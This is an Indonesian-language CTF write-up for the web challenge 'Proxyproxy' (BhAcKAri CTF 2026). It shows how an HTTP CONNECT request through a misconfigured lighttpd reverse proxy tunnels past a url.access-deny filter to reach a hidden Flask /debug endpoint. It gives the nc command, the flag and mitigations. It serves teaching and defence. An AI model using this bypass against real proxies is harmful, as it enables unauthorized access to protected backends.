---
ctf: "BhAcKAri CTF 2026"
kategori: "Web"
challenge: "Proxyproxy (nothing here pt. 2)"
flag: "bhackariCTF{ed7b8baf6bd6341f194a95394c1acd314cee7871de0eb67c}"
teknik: "lighttpd url.access-deny hanya suffix-match HTTP request line; HTTP CONNECT / adalah verb tunneling yang membuka TCP tunnel langsung ke backend Flask"
---

# Proxyproxy (nothing here pt. 2) — BhAcKAri CTF 2026 (Web)

## Deskripsi Singkat

`GET http://proxy.challs.ctf.bhackari.it:3002/` mengembalikan string `Nothing here`. Handout mengungkap backend Flask tersembunyi di balik reverse proxy `lighttpd` (dibangun dari HEAD `lighttpd/lighttpd1.4`, jadi binary yang jalan adalah `1.4.83-devel`), dengan config `url.access-deny = ( "debug" )` dan `proxy.header` yang mengaktifkan `upgrade` dan **`connect => enable`**.

## Analisis — Filter-nya adalah Suffix Match Case-Sensitive

Memetakan filter secara empiris: `POST /debug` → 403; `POST /xdebug` → 403 (suffix match kena); `POST /debugX` → 404 (tidak suffix match → lolos proxy); `POST /a/../debug` → 403 (lighttpd menormalisasi `../`); `POST /%64ebug` → 403 (lighttpd men-decode `%`). Jadi `url.access-deny` milik lighttpd melakukan *suffix match case-sensitive terhadap path yang sudah didecode dan dinormalisasi penuh*. Lewat HTTP biasa, ini mustahil dibypass.

**Dua setting `proxy.header` yang tidak biasa.** `connect => enable` membuat `mod_proxy` **menerima verb `HTTP CONNECT`** pada URL yang tercakup rule `proxy.server`, dan men-tunnel TCP langsung ke backend.

## Eksploitasi / Solusi

`CONNECT /` adalah gerakan ajaibnya. Path `/` cocok dengan `proxy.server = ("/" => …)` *dan* tidak diakhiri `debug`, jadi lighttpd menerimanya:

```bash
$ printf 'CONNECT / HTTP/1.1\r\nHost: x\r\n\r\n' | nc -q2 proxy.challs.ctf.bhackari.it 3002
HTTP/1.1 200 OK
```

Setelah `200`, lighttpd menyerahkan socket TCP ke backend dan berhenti mem-parsing apa pun yang lewat. Byte berikutnya dikirim verbatim ke Flask:

```text
client  ────CONNECT / HTTP/1.1───────►  lighttpd  ──TCP tunnel──►  Flask
client  ────POST /debug HTTP/1.0─────────────────────────────►   /debug
client  ◄───HTTP/1.0 200 + flag───────────────────────────────
```

Satu koneksi TCP, dua pesan, tanpa trik smuggling apa pun.

## Catatan / Insight

**Pelajaran untuk web:** **`HTTP CONNECT` adalah verb tunneling, bukan verb proxying.** Ketika `mod_proxy` menerima CONNECT pada URL non-internal, ia kehilangan kemampuan memeriksa apa yang mengalir setelah handshake `200 OK`. Mitigasinya: (a) matikan `connect => enable` kecuali kamu benar-benar menjalankan forward proxy HTTPS, atau (b) batasi CONNECT ke bentuk `CONNECT $HOST:$PORT` yang tidak cocok dengan ruang URL backend. Menyetel `url.access-deny` pada pola URL hanya melindungi baris request HTTP yang benar-benar diparsing lighttpd — begitu tunnel CONNECT terbuka, semua taruhan batal.

## Flag

```
bhackariCTF{ed7b8baf6bd6341f194a95394c1acd314cee7871de0eb67c}
```
